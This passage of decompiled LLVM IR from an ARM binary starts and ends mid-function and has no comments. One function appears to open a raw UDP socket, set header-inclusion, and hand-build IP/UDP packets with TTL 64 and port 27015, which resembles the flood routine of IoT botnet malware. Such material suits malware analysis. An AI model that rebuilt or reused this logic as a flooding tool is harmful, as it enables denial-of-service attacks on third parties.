  %v2_a3e0 = call i32 @llvm.bswap.i32(i32 %v8_a3c0)
  store i32 %v2_a3e0, i32* %r3.global-to-local, align 4
  store i1 %v7_a254, i1* %cpsr_z.global-to-local, align 1
  %v1_a3e8 = load i32, i32* @r5, align 4
  %v2_a3e8 = add i32 %v1_a3e8, 16
  %v3_a3e8 = inttoptr i32 %v2_a3e8 to i32*
  store i32 %v2_a3e0, i32* %v3_a3e8, align 4
  br i1 %v2_a254, label %dec_label_pc_a3f0, label %dec_label_pc_a25c

dec_label_pc_a3f0:                                ; preds = %dec_label_pc_a388, %dec_label_pc_a250
  %v0_a3f0 = call i32 @function_e978()
  store i32 %v0_a3f0, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  %v0_a3fc = load i32, i32* @sl, align 4
  %v9_a3fc = icmp eq i32 %v0_a3fc, 65535
  store i1 %v9_a3fc, i1* %cpsr_z.global-to-local, align 1
  %v1_a400 = load i32, i32* @r5, align 4
  %v2_a400 = add i32 %v1_a400, 12
  %v3_a400 = inttoptr i32 %v2_a400 to i32*
  store i32 %v0_a3f0, i32* %v3_a400, align 4
  br i1 %v9_a3fc, label %dec_label_pc_a408, label %dec_label_pc_a3f0.dec_label_pc_a26c_crit_edge

dec_label_pc_a3f0.dec_label_pc_a26c_crit_edge:    ; preds = %dec_label_pc_a3f0
  %v1_a270.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a26c

dec_label_pc_a408:                                ; preds = %dec_label_pc_a3f0, %dec_label_pc_a25c
  %v0_a408 = call i32 @function_e978()
  %v3_a410 = urem i32 %v0_a408, 65536
  store i32 %v3_a410, i32* %r0.global-to-local, align 4
  %v3_a41415 = udiv i32 %v0_a408, 256
  %v1_a418 = trunc i32 %v3_a41415 to i8
  %v2_a418 = load i32, i32* @r5, align 4
  %v3_a418 = add i32 %v2_a418, 5
  %v4_a418 = inttoptr i32 %v3_a418 to i8*
  store i8 %v1_a418, i8* %v4_a418, align 1
  %v0_a41c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v3_9f50, i32* %r3.global-to-local, align 4
  %v1_a424 = sub i32 999, %v0_a41c
  store i32 %v1_a424, i32* %r2.global-to-local, align 4
  %v3_a428 = sdiv i32 %v1_a424, 256
  store i32 %v3_a428, i32* %r1.global-to-local, align 4
  %v1_a42c = load i32, i32* @r4, align 4
  %v9_a42c = icmp eq i32 %v3_9f50, %v1_a42c
  store i1 %v9_a42c, i1* %cpsr_z.global-to-local, align 1
  %v1_a430 = trunc i32 %v0_a41c to i8
  %v2_a430 = load i32, i32* @r5, align 4
  %v3_a430 = add i32 %v2_a430, 4
  %v4_a430 = inttoptr i32 %v3_a430 to i8*
  store i8 %v1_a430, i8* %v4_a430, align 1
  %v0_a434 = load i32, i32* %r1.global-to-local, align 4
  %v1_a434 = trunc i32 %v0_a434 to i8
  %v2_a434 = load i32, i32* @r6, align 4
  %v3_a434 = add i32 %v2_a434, 5
  %v4_a434 = inttoptr i32 %v3_a434 to i8*
  store i8 %v1_a434, i8* %v4_a434, align 1
  %v0_a438 = load i32, i32* %r2.global-to-local, align 4
  %v1_a438 = trunc i32 %v0_a438 to i8
  %v2_a438 = load i32, i32* @r6, align 4
  %v3_a438 = add i32 %v2_a438, 4
  %v4_a438 = inttoptr i32 %v3_a438 to i8*
  store i8 %v1_a438, i8* %v4_a438, align 1
  %v0_a43c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a43c, label %dec_label_pc_a440, label %dec_label_pc_a408.dec_label_pc_a278_crit_edge

dec_label_pc_a408.dec_label_pc_a278_crit_edge:    ; preds = %dec_label_pc_a408
  %v1_a27c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a278

dec_label_pc_a440:                                ; preds = %dec_label_pc_a408, %dec_label_pc_a26c
  %v0_a440 = call i32 @function_e978()
  %v1_a440 = trunc i32 %v0_a440 to i8
  store i32 %v0_a440, i32* %r0.global-to-local, align 4
  store i32 %v3_9f54, i32* %r1.global-to-local, align 4
  %v4_a448 = sdiv i32 %v0_a440, 256
  store i32 %v4_a448, i32* %r3.global-to-local, align 4
  %v1_a44c = load i32, i32* @r4, align 4
  %v9_a44c = icmp eq i32 %v3_9f54, %v1_a44c
  store i1 %v9_a44c, i1* %cpsr_z.global-to-local, align 1
  %v3_a450 = load i32, i32* @r5, align 4
  %v4_a450 = add i32 %v3_a450, 44
  %v5_a450 = inttoptr i32 %v4_a450 to i8*
  store i8 %v1_a440, i8* %v5_a450, align 1
  %v0_a454 = load i32, i32* %r3.global-to-local, align 4
  %v1_a454 = trunc i32 %v0_a454 to i8
  %v2_a454 = load i32, i32* @r7, align 4
  %v3_a454 = add i32 %v2_a454, 1
  %v4_a454 = inttoptr i32 %v3_a454 to i8*
  store i8 %v1_a454, i8* %v4_a454, align 1
  %v0_a458 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a458, label %dec_label_pc_a45c, label %dec_label_pc_a284

dec_label_pc_a45c:                                ; preds = %dec_label_pc_a440, %dec_label_pc_a278
  %v0_a45c = call i32 @function_e978()
  %v1_a45c = trunc i32 %v0_a45c to i8
  store i32 %v0_a45c, i32* %r0.global-to-local, align 4
  store i32 %v1_9f48, i32* %r2.global-to-local, align 4
  %v4_a464 = sdiv i32 %v0_a45c, 256
  store i32 %v4_a464, i32* %r3.global-to-local, align 4
  store i1 %v2_a288, i1* %cpsr_z.global-to-local, align 1
  %v1_a46c = trunc i32 %v4_a464 to i8
  %v2_a46c = load i32, i32* @r7, align 4
  %v3_a46c = add i32 %v2_a46c, 3
  %v4_a46c = inttoptr i32 %v3_a46c to i8*
  store i8 %v1_a46c, i8* %v4_a46c, align 1
  %v0_a470 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a470, label %bb101, label %bb100

bb100:                                            ; preds = %dec_label_pc_a45c
  %v1_a470 = load i32, i32* @r5, align 4
  %v2_a470 = add i32 %v1_a470, 16
  %v3_a470 = inttoptr i32 %v2_a470 to i32*
  %v4_a470 = load i32, i32* %v3_a470, align 4
  store i32 %v4_a470, i32* %r3.global-to-local, align 4
  br label %bb101

bb101:                                            ; preds = %dec_label_pc_a45c, %bb100
  %v3_a474 = load i32, i32* @r7, align 4
  %v4_a474 = add i32 %v3_a474, 2
  %v5_a474 = inttoptr i32 %v4_a474 to i8*
  store i8 %v1_a45c, i8* %v5_a474, align 1
  %v0_a478 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a478, label %dec_label_pc_a480, label %bb102

bb102:                                            ; preds = %bb101
  %v1_a478 = load i32, i32* %r3.global-to-local, align 4
  %v2_a478 = load i32, i32* @r6, align 4
  %v3_a478 = add i32 %v2_a478, 16
  %v4_a478 = inttoptr i32 %v3_a478 to i32*
  store i32 %v1_a478, i32* %v4_a478, align 4
  br label %dec_label_pc_a298

dec_label_pc_a480:                                ; preds = %dec_label_pc_a284, %bb101
  %v0_a480 = call i32 @function_e978()
  store i32 %v0_a480, i32* %r0.global-to-local, align 4
  store i32 %v1_9eb4, i32* %r3.global-to-local, align 4
  store i1 %v2_a488, i1* %cpsr_z.global-to-local, align 1
  %v1_a48c = load i32, i32* @r6, align 4
  %v2_a48c = add i32 %v1_a48c, 16
  %v3_a48c = inttoptr i32 %v2_a48c to i32*
  store i32 %v0_a480, i32* %v3_a48c, align 4
  br i1 %v2_a488, label %dec_label_pc_a2a4, label %dec_label_pc_a494

dec_label_pc_a494:                                ; preds = %dec_label_pc_a298, %dec_label_pc_a480
  %v0_a494 = load i32, i32* @r7, align 4
  %v1_a494 = add i32 %v0_a494, 8
  store i32 %v1_a494, i32* %r0.global-to-local, align 4
  store i32 %v5_9e94, i32* @r1, align 4
  %v1_a49c = inttoptr i32 %v1_a494 to i8*
  %v2_a49c = call i32 @function_eaf8(i8* %v1_a49c)
  store i32 %v2_a49c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a2a4

dec_label_pc_a4a4:                                ; preds = %dec_label_pc_9f34
  %v1_a4ac = add i32 %v5_9e94, 8
  store i32 %v1_a4ac, i32* %r2.global-to-local, align 4
  %v1_a4b0 = add i32 %v5_9e94, 52
  store i32 %v1_a4b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a210.preheader

; uselistorder directives
  uselistorder i32 %v1_a4b0, { 1, 0 }
  uselistorder i32 %v1_a4ac, { 1, 0 }
  uselistorder i32 %v4_a464, { 1, 0 }
  uselistorder i32 %v0_a45c, { 0, 2, 1 }
  uselistorder i32 %v0_a440, { 0, 2, 1 }
  uselistorder i32 %v2_a3e0, { 1, 0 }
  uselistorder i32 %v8_a3c0, { 1, 2, 0 }
  uselistorder i32 %v0_a39c, { 1, 0, 2 }
  uselistorder i32 %v1_a368, { 1, 2, 0 }
  uselistorder i32 %v1_a364, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_a308, { 1, 0, 2 }
  uselistorder i32 %v4_a304, { 0, 2, 1 }
  uselistorder i32 %v0_a2e4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_a2d4, { 0, 2, 1 }
  uselistorder i32 %v4_a2b8, { 1, 0 }
  uselistorder i32 %v7_a23c, { 1, 0, 2 }
  uselistorder i32 %v0_a210, { 1, 0 }
  uselistorder i1 %v7_a254, { 2, 1, 0 }
  uselistorder i1 %v2_a488, { 2, 3, 1, 0 }
  uselistorder i32 %v1_a1d0, { 1, 0, 2 }
  uselistorder i32 %v0_a194, { 1, 0, 2 }
  uselistorder i32 %v3_a048, { 0, 2, 1 }
  uselistorder i32 %v3_a008, { 1, 0 }
  uselistorder i32 %tmp86, { 1, 0 }
  uselistorder i32 %v1_9fc0, { 1, 0 }
  uselistorder i32 %v1_9f9c, { 1, 0 }
  uselistorder i32 %v1_9f98, { 0, 2, 1 }
  uselistorder i32 %v3_9f7c, { 2, 1, 0 }
  uselistorder i32 %v0_9f58, { 1, 0, 2 }
  uselistorder i32 %v1_9f48, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_9f44, { 0, 2, 1 }
  uselistorder i32 %v0_9f40, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_9f2c, { 1, 0 }
  uselistorder i1 %v7_9f00, { 1, 0 }
  uselistorder i32 %v3_9efc, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_9ee8, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_9eb4, { 1, 0, 2 }
  uselistorder i32 %v5_9e94, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8 %v5_9e38, { 1, 0 }
  uselistorder i32 %v2_9dc8, { 0, 3, 1, 2 }
  uselistorder i32 %v1_9dac, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 20, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 36, 35, 37, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 6, 7, 4, 5, 9, 8, 10, 13, 11, 12, 14, 16, 15, 17, 18, 23, 19, 20, 21, 22, 26, 24, 25, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29 }
  uselistorder label %dec_label_pc_a494, { 1, 0 }
  uselistorder label %dec_label_pc_a480, { 1, 0 }
  uselistorder label %bb101, { 1, 0 }
  uselistorder label %dec_label_pc_a380, { 1, 0 }
  uselistorder label %dec_label_pc_a2a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a210.preheader, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %bb93, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %.thread23, { 2, 1, 0 }
}

define i32 @function_a4c4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a4c4:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_a4c4 = load i32, i32* @r4, align 4
  %v12_a4c4 = load i32, i32* @r7, align 4
  %v1_a4c8 = urem i32 %arg1, 256
  store i32 %v1_a4c8, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @sl, align 4
  %v1_a4dc = urem i32 %arg3, 256
  store i32 %v1_a4dc, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_a4e4 = call i32 @function_126cc(i32 %v1_a4c8, i32 4)
  %v0_a4e8 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_a4f4 = load i32, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_a4fc = inttoptr i32 %v0_a4e8 to i32*
  %v6_a4fc = call i32 @function_85e0(i32 %v0_a4f4, i32* %v5_a4fc, i32 2, i32 0)
  %v1_a508 = urem i32 %v6_a4fc, 256
  store i32 %v1_a508, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a514 = load i32, i32* @r4, align 4
  %v0_a518 = load i32, i32* @r5, align 4
  %v5_a51c = trunc i32 %v6_a4fc to i8
  %v6_a520 = inttoptr i32 %v0_a518 to i32*
  %v7_a520 = call i32 @function_85e0(i32 %v0_a514, i32* %v6_a520, i32 3, i32 65535)
  %v0_a524 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a520, i32* @r7, align 4
  %v0_a534 = load i32, i32* @r4, align 4
  %v4_a538 = inttoptr i32 %v0_a524 to i32*
  %v5_a538 = call i32 @function_85e0(i32 %v0_a534, i32* %v4_a538, i32 4, i32 64)
  %v1_a540 = urem i32 %v5_a538, 256
  store i32 %v1_a540, i32* %ip.global-to-local, align 4
  %v0_a544 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a550 = load i32, i32* @r4, align 4
  %v5_a554 = trunc i32 %v5_a538 to i8
  %v6_a558 = inttoptr i32 %v0_a544 to i32*
  %v7_a558 = call i32 @function_85e0(i32 %v0_a550, i32* %v6_a558, i32 5, i32 0)
  %v1_a564 = urem i32 %v7_a558, 256
  store i32 %v1_a564, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a570 = load i32, i32* @r4, align 4
  %v0_a574 = load i32, i32* @r5, align 4
  %v5_a57c = inttoptr i32 %v0_a574 to i32*
  %v6_a57c = call i32 @function_85e0(i32 %v0_a570, i32* %v5_a57c, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a58c = load i32, i32* @r5, align 4
  store i32 %v6_a57c, i32* @r6, align 4
  %v0_a594 = load i32, i32* @r4, align 4
  %v4_a598 = inttoptr i32 %v0_a58c to i32*
  %v5_a598 = call i32 @function_85e0(i32 %v0_a594, i32* %v4_a598, i32 7, i32 27015)
  store i32 %v5_a598, i32* @r4, align 4
  %v1_a5a4 = call i32 @function_10c20(i32 20)
  %v3_a5b0 = call i32 @function_10b3c(i32 20, i32* nonnull %stack_var_-44)
  store i32 %v3_a5b0, i32* %r8.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_a5c4 = call i32 @function_123e0(i32 2, i32 3, i32 17)
  %v7_a5c8 = icmp eq i32 %v3_a5c4, -1
  store i1 %v7_a5c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a5c4, i32* %fp.global-to-local, align 4
  br i1 %v7_a5c8, label %dec_label_pc_a97c, label %dec_label_pc_a5d4

dec_label_pc_a5d4:                                ; preds = %dec_label_pc_a4c4
  store i32 1, i32* %stack_var_-40, align 4
  %v6_a5dc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_a5dc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_a5f0 = call i32 @function_123b0(i32 %v3_a5c4, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  %v7_a5f4 = icmp eq i32 %v6_a5f0, -1
  store i1 %v7_a5f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a5f4, label %dec_label_pc_a974, label %dec_label_pc_a5fc

dec_label_pc_a5fc:                                ; preds = %dec_label_pc_a5d4
  %v0_a5fc = load i32, i32* @r4, align 4
  %v3_a5fc = mul i32 %v0_a5fc, 65536
  store i32 %v3_a5fc, i32* @lr, align 4
  %v0_a600 = load i32, i32* @r7, align 4
  %v0_a604 = load i32, i32* @r6, align 4
  %v3_a604 = mul i32 %v0_a604, 65536
  store i32 %v3_a604, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_a60c = urem i32 %v0_a600, 65536
  %v3_a610 = urem i32 %v0_a604, 65536
  store i32 %v3_a610, i32* %r2.global-to-local, align 4
  %v3_a614 = urem i32 %v0_a5fc, 65536
  store i32 %v3_a614, i32* %r3.global-to-local, align 4
  %v0_a618 = load i32, i32* %sb.global-to-local, align 4
  %v2_a618 = icmp eq i32 %v0_a618, 0
  store i1 %v2_a618, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp50 = icmp slt i32 %v0_a618, 1
  br i1 %tmp50, label %dec_label_pc_a79c, label %dec_label_pc_a630

dec_label_pc_a630:                                ; preds = %dec_label_pc_a5fc
  %v1_a634 = urem i32 %v0_a5fc, 256
  %v1_a638 = urem i32 %v0_a604, 256
  %v1_a63c = urem i32 %v0_a600, 256
  %v3_a640 = mul nuw nsw i32 %v1_a638, 256
  %v3_a644 = mul nuw nsw i32 %v1_a634, 256
  %tmp51 = udiv i32 %v0_a600, 256
  %v3_a648 = urem i32 %tmp51, 256
  %v4_a64c = mul nuw nsw i32 %v1_a63c, 256
  %v5_a64c = or i32 %v4_a64c, %v3_a648
  store i32 %v5_a64c, i32* @r7, align 4
  %tmp52 = udiv i32 %v0_a5fc, 256
  %v4_a650 = urem i32 %tmp52, 256
  %v5_a650 = or i32 %v4_a650, %v3_a644
  store i32 %v5_a650, i32* @r5, align 4
  %tmp53 = udiv i32 %v0_a604, 256
  %v4_a654 = urem i32 %tmp53, 256
  %v5_a654 = or i32 %v4_a654, %v3_a640
  store i32 %v5_a654, i32* @r6, align 4
  store i32 %v1_a638, i32* %r2.global-to-local, align 4
  store i32 %v1_a634, i32* %r3.global-to-local, align 4
  %v2_a6d0 = icmp eq i32 %v1_a564, 0
  %v4_a6d4 = sext i8 %v5_a554 to i32
  %sext = mul i32 %v0_a600, 16777216
  %v4_a6f0 = sdiv i32 %sext, 16777216
  %sext6 = mul i32 %v0_a604, 16777216
  %v4_a74c = sdiv i32 %sext6, 16777216
  %sext7 = mul i32 %v0_a5fc, 16777216
  %v4_a76c = sdiv i32 %sext7, 16777216
  br label %dec_label_pc_a670

dec_label_pc_a670:                                ; preds = %bb57, %dec_label_pc_a630
  %v2_a678 = call i32 @function_126cc(i32 128, i32 1)
  store i32 %v2_a4e4, i32* %r2.global-to-local, align 4
  %v3_a680 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a680, i32* %r3.global-to-local, align 4
  %v2_a684 = load i32, i32* @r4, align 4
  %v5_a684 = mul i32 %v2_a684, 4
  %v6_a684 = add i32 %v5_a684, %v2_a4e4
  %v7_a684 = inttoptr i32 %v6_a684 to i32*
  store i32 %v2_a678, i32* %v7_a684, align 4
  %v0_a688 = load i32, i32* %r2.global-to-local, align 4
  %v1_a688 = load i32, i32* %r3.global-to-local, align 4
  %v4_a688 = mul i32 %v1_a688, 4
  %v5_a688 = add i32 %v4_a688, %v0_a688
  %v6_a688 = inttoptr i32 %v5_a688 to i32*
  %v7_a688 = load i32, i32* %v6_a688, align 4
  store i32 %v7_a688, i32* @lr, align 4
  %v1_a68c = inttoptr i32 %v7_a688 to i8*
  %v2_a68c = load i8, i8* %v1_a68c, align 1
  %tmp = urem i8 %v2_a68c, 16
  %v1_a690 = zext i8 %tmp to i32
  %v1_a694 = or i32 %v1_a690, 64
  store i32 %v1_a694, i32* %r3.global-to-local, align 4
  %v1_a698 = trunc i32 %v1_a694 to i8
  store i8 %v1_a698, i8* %v1_a68c, align 1
  %v0_a69c = load i32, i32* @lr, align 4
  %v1_a69c = inttoptr i32 %v0_a69c to i8*
  %v2_a69c = load i8, i8* %v1_a69c, align 1
  %v1_a6a0 = and i8 %v2_a69c, -16
  %v1_a6a4 = or i8 %v1_a6a0, 5
  store i8 %v1_a6a4, i8* %v1_a69c, align 1
  %v2_a6b0 = load i32, i32* @lr, align 4
  %v3_a6b0 = add i32 %v2_a6b0, 1
  %v4_a6b0 = inttoptr i32 %v3_a6b0 to i8*
  store i8 %v5_a51c, i8* %v4_a6b0, align 1
  %v3_a6b4 = load i32, i32* %stack_var_-44, align 4
  %v1_a6b8 = add i32 %v3_a6b4, 32
  %tmp54 = mul i32 %v1_a6b8, 256
  %v1_a6c4 = and i32 %tmp54, 65280
  %tmp55 = udiv i32 %v1_a6b8, 256
  %v4_a6c8 = urem i32 %tmp55, 256
  %v5_a6c8 = or i32 %v4_a6c8, %v1_a6c4
  store i32 %v5_a6c8, i32* %r2.global-to-local, align 4
  store i1 %v2_a6d0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_a6d4, i32* %r3.global-to-local, align 4
  %v2_a6d8 = load i32, i32* @lr, align 4
  %v3_a6d8 = add i32 %v2_a6d8, 8
  %v4_a6d8 = inttoptr i32 %v3_a6d8 to i8*
  store i8 %v5_a554, i8* %v4_a6d8, align 1
  %v0_a6dc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a6dc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a670
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a6e0 = load i32, i32* @lr, align 4
  %v4_a6e0 = add i32 %v3_a6e0, 6
  %v5_a6e0 = inttoptr i32 %v4_a6e0 to i8*
  store i8 64, i8* %v5_a6e0, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a670, %bb
  %v0_a6e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a6e4 = trunc i32 %v0_a6e4 to i8
  %v2_a6e4 = load i32, i32* @lr, align 4
  %v3_a6e4 = add i32 %v2_a6e4, 2
  %v4_a6e4 = inttoptr i32 %v3_a6e4 to i8*
  store i8 %v1_a6e4, i8* %v4_a6e4, align 1
  %v0_a6e8 = load i32, i32* %r2.global-to-local, align 4
  %v3_a6e8 = sdiv i32 %v0_a6e8, 256
  store i32 %v3_a6e8, i32* %ip.global-to-local, align 4
  store i32 %v4_a6f0, i32* %r2.global-to-local, align 4
  %v2_a6f4 = load i32, i32* @lr, align 4
  %v3_a6f4 = add i32 %v2_a6f4, 9
  %v4_a6f4 = inttoptr i32 %v3_a6f4 to i8*
  store i8 17, i8* %v4_a6f4, align 1
  store i32 ptrtoint (i32* @global_var_1cb1c.49 to i32), i32* %r3.global-to-local, align 4
  %v0_a6fc = load i32, i32* %r2.global-to-local, align 4
  %v1_a6fc = trunc i32 %v0_a6fc to i8
  %v2_a6fc = load i32, i32* @lr, align 4
  %v3_a6fc = add i32 %v2_a6fc, 5
  %v4_a6fc = inttoptr i32 %v3_a6fc to i8*
  store i8 %v1_a6fc, i8* %v4_a6fc, align 1
  %v0_a700 = load i32, i32* %ip.global-to-local, align 4
  %v1_a700 = trunc i32 %v0_a700 to i8
  %v2_a700 = load i32, i32* @lr, align 4
  %v3_a700 = add i32 %v2_a700, 3
  %v4_a700 = inttoptr i32 %v3_a700 to i8*
  store i8 %v1_a700, i8* %v4_a700, align 1
  %v0_a704 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a704, label %.thread8, label %bb56

.thread8:                                         ; preds = %.thread
  %v3_a7089 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a7089, i32* %ip.global-to-local, align 4
  br label %bb57

bb56:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a708 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a708, i32* %ip.global-to-local, align 4
  %v3_a70c = load i32, i32* @lr, align 4
  %v4_a70c = add i32 %v3_a70c, 7
  %v5_a70c = inttoptr i32 %v4_a70c to i8*
  store i8 0, i8* %v5_a70c, align 1
  %v0_a714.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %bb56
  %v0_a714 = phi i32 [ %v3_a7089, %.thread8 ], [ %v0_a714.pre, %bb56 ]
  %v2_a710 = load i32, i32* @global_var_1cb1c.49, align 4
  store i32 %v2_a710, i32* %r2.global-to-local, align 4
  %v3_a714 = mul i32 %v0_a714, 32
  store i32 %v3_a714, i32* %r3.global-to-local, align 4
  %v1_a718 = load i32, i32* @lr, align 4
  %v2_a718 = add i32 %v1_a718, 12
  %v3_a718 = inttoptr i32 %v2_a718 to i32*
  store i32 %v2_a710, i32* %v3_a718, align 4
  %v0_a71c = load i32, i32* %r3.global-to-local, align 4
  %v1_a71c = load i32, i32* %ip.global-to-local, align 4
  %tmp60 = mul i32 %v1_a71c, -8
  %v5_a71c = add i32 %v0_a71c, %tmp60
  %v1_a720 = load i32, i32* @sl, align 4
  %v2_a720 = add i32 %v5_a71c, %v1_a720
  store i32 %v2_a720, i32* %r3.global-to-local, align 4
  %v1_a724 = add i32 %v2_a720, 16
  %v2_a724 = inttoptr i32 %v1_a724 to i32*
  %v3_a724 = load i32, i32* %v2_a724, align 4
  %v1_a728 = load i32, i32* @lr, align 4
  %v2_a728 = add i32 %v1_a728, 16
  %v3_a728 = inttoptr i32 %v2_a728 to i32*
  store i32 %v3_a724, i32* %v3_a728, align 4
  %v3_a72c = load i32, i32* %stack_var_-44, align 4
  %v1_a730 = add i32 %v3_a72c, 12
  %tmp58 = mul i32 %v1_a730, 256
  %v1_a740 = and i32 %tmp58, 65280
  %tmp59 = udiv i32 %v1_a730, 256
  %v4_a744 = urem i32 %tmp59, 256
  %v5_a744 = or i32 %v4_a744, %v1_a740
  store i32 %v5_a744, i32* %ip.global-to-local, align 4
  %v1_a748 = load i32, i32* @lr, align 4
  %v2_a748 = add i32 %v1_a748, 28
  %v3_a748 = inttoptr i32 %v2_a748 to i32*
  store i32 -1, i32* %v3_a748, align 4
  store i32 %v4_a74c, i32* %r2.global-to-local, align 4
  %v0_a750 = load i32, i32* @lr, align 4
  %v1_a750 = add i32 %v0_a750, 20
  store i32 %v1_a750, i32* %r4.global-to-local, align 4
  %v0_a754 = load i32, i32* %ip.global-to-local, align 4
  %v3_a754 = sdiv i32 %v0_a754, 256
  store i32 %v3_a754, i32* %r3.global-to-local, align 4
  %v0_a758 = load i32, i32* @r7, align 4
  %v1_a758 = trunc i32 %v0_a758 to i8
  %v3_a758 = add i32 %v0_a750, 4
  %v4_a758 = inttoptr i32 %v3_a758 to i8*
  store i8 %v1_a758, i8* %v4_a758, align 1
  %v0_a75c = load i32, i32* @r6, align 4
  %v1_a75c = trunc i32 %v0_a75c to i8
  %v2_a75c = load i32, i32* @lr, align 4
  %v3_a75c = add i32 %v2_a75c, 20
  %v4_a75c = inttoptr i32 %v3_a75c to i8*
  store i8 %v1_a75c, i8* %v4_a75c, align 1
  %v0_a760 = load i32, i32* %r3.global-to-local, align 4
  %v1_a760 = trunc i32 %v0_a760 to i8
  %v2_a760 = load i32, i32* %r4.global-to-local, align 4
  %v3_a760 = add i32 %v2_a760, 5
  %v4_a760 = inttoptr i32 %v3_a760 to i8*
  store i8 %v1_a760, i8* %v4_a760, align 1
  %v0_a764 = load i32, i32* @r5, align 4
  %v1_a764 = trunc i32 %v0_a764 to i8
